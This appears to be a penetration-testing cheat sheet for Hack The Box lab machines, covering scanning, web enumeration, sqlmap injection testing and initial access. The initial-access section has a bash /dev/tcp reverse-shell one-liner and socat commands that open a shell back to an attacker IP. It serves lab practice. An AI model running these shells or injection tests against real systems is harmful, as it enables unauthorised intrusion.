
# Stock Tools to Install
 * chmod +x install.tools.sh
 * sudo ./install.tools.sh

# Table of Contents
1. Prerequisites
    1. Machine Setup
    2. Hosts DNS Settings
2. Reconnaissance
    1. General Port Scanning
    2. Banner Grabbing
3. Enumeration
    1. Web Application Enumeration
4. Initial Access
    1. Upgrade Dumb Shell Fully Interactive Shell
5. Lateral Movement
6. Privilege Escalation

# Prerequisites
---
* set up attack machine

    ### Machine Setup
    ```
    export HTBIP=<ip>
    export HTB=<machine name>
    export HTBWEB=<website>                 # example: http://larry.htb/
    ```

    ### Hosts DNS Settings
    ```
    sudo vi /etc/hosts                      # This file acts like a dns resolver for us
    <ip>  <hostname.htb>
    ```

# Reconnaissance
---
* Gather information about the target system, network, or application.

    ### General Port Scanning
    ```
    $ sudo nmap -sC -sV -oA $HTB $HTBIP     # Scan for common scripts, enumerate versions, and output all formats
    $ sudo nmap -sU -A $HTBIP               # UDP port scan with version detection
    ```

    ### Banner Grabbing
    ```
    $ nc $HTBIP <port>                      # Connect to a specific port for banner grabbing
    ```

# Enumeration
---
* Enumerate user accounts, applications, and other relevant findings.

    ### Web Application Enumeration
    ```
    $ nmap -p 80,443 $HTBIP --script http-vuln*     # Nmap script to find common web vulnerabilities
    $ nmap -p 80,443 $HTBIP --script http-enum*     # Nmap script to enumerate web applications

    $ gobuster dir -u $HTBWEB -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 40
    $ gobuster dir -u $HTBWEB -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 40
    $ gobuster dns -d mydomain.com -w /usr/share/wordlists/SecLists/Discovery/DNS/combined_subdomains.txt -t 40
    $ gobuster vhost -u box.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 64 --append-domain 

    $ wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://FUZZ.keeper.htb" 

    $ nikto -host $HTBWEB

    $ sqlmap -u $HTBWEB/login --data="username=test&password=test" --dbs    # SQL injection testing with sqlmap
    ```

# Initial Access
---
* Exploit vulnerabilities to gain initial access to the target system.

    ### One Liner Reverse Shells
    ```
    bash -i 5<> /dev/tcp/127.0.0.1/9001 0<&5 1>&5 2>&5
    ```


    ### Upgrade Dumb Shell Fully Interactive Shell
    ```
    # method 1 Python
    $ python -c 'import pty; pty.spawn("/bin/bash")'                            # run this on victim
    $ Press Ctrl + Z to background the shell.
    $ stty raw -echo; fg

    # method 2 socat
    $ socat file:`tty`,raw,echo=0 TCP-LISTEN:4444                               # on attach machine
    $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attack IP>:4444  # run this on victim
    ```

# Lateral Movement
---
* Move laterally within the network to explore and compromise other systems.

# Privilege Escalation
---
* Elevate privileges to gain higher-level access, such as moving from a low-privileged user to an administrator or root.

	### Buffer Overflows

	#### 32-bit Architecture, no memory protections
